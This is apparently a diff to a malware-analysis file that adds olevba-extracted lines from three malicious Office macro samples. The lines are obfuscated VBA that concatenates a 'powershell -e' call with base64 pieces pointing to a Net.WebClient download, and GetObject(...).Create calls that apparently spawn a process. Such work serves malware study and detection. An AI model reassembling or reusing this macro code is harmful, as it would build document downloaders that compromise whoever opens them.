@@ -139,6 +139,10 @@ ff020ce959d59d8464bb203470babf7b9b201f0287e0a01587a1c766819455cc
 846f.olevba:Z1790_07.ShowWindow = O_9_556 + 73271 - 73271 + J66_38
 ff02.olevba:U9814_2_.ShowWindow = G23_1_ + 952579 - 952579 + U9___08
 
+77ac.olevba:l0_1__ Y96_10 + "powe" + I52_31 + L_8_993_ + A_779_ + z04__6 + c834490_ + B_33_0_ + z362_579 + c59_13_7 + B_2723_ + i88872_1, r_1465 + c3___60 + a9_603_
+846f.olevba:j__020 X040379 + "powe" + d63677 + z58_2908 + J_362__ + i_2__9 + z_615_6 + V9_51_00 + S2976052 + O05_63_ + L0_2__25 + B12420_ + Y97_49 + K486380, o1_5696 + a_36_923 + R_37523
+ff02.olevba:w_5024 z__69__ + "powe" + R260077 + M4_61_ + j89_9_ + C8197_ + L_1_6_ + w4_8139 + F__868_1 + w62150 + k11_44, N7685_1 + j8___38 + q_545470 + R28_2728
+
 77ac.olevba:w94_41 = "rsheL" + "l -" + "e JAB" + "aADkAX" + "wBfAD"
 846f.olevba:U_40_4 = "rsheLl" + " -e J" + "ABX" + "ADcANA" + "BfAF8" + "ANQA" + "wAD0"
 ff02.olevba:m_1_2_ = "rsheLl" + " -e J" + "ABq" + "ADMAMw" + "A5A" + "DQAX" + "wA9A" + "CgAJ"
@@ -177,3 +181,6 @@ ff02.olevba:b5_598 = "AJw" + "ApADs" + "AJA" + "BkAF8" + "AMwA4A" + "DAA"
 ff02.olevba:k45__1 = "OAAxAD" + "gAPQB" + "uAGUAd" + "wAtAG8" + "AYgBq" + "AGUAYw" + "B0AC" + "AATgBl"
 ff02.olevba:O5938___ = "AHQ" + "ALg" + "BXAGUA" + "YgBD" + "AGwAa" + "QBlAG" + "4AdA"
 
+77ac.olevba:o2_34_2_ = GetObject(r098_70 + j40_1__ + E2_079).Create((z31563 + o7_572_ + X69103_3 + B692634 + s7_05__ + X879459), w0_330, S04___, j33753)
+846f.olevba:S__2953 = GetObject(C2_0_81 + D76__47 + H20_560_).Create((E56065 + Q1719__3 + E31_6_26 + i_8__6_6 + j31_197 + r5__225), C58685, Z1790_07, q_51130)
+ff02.olevba:M825_2_ = GetObject(l073__1 + F29__4 + L78059).Create((s064___ + p84753 + Q86977_ + F6_1_55 + K7_9413), m82_5009, U9814_2_, E_10_47_)
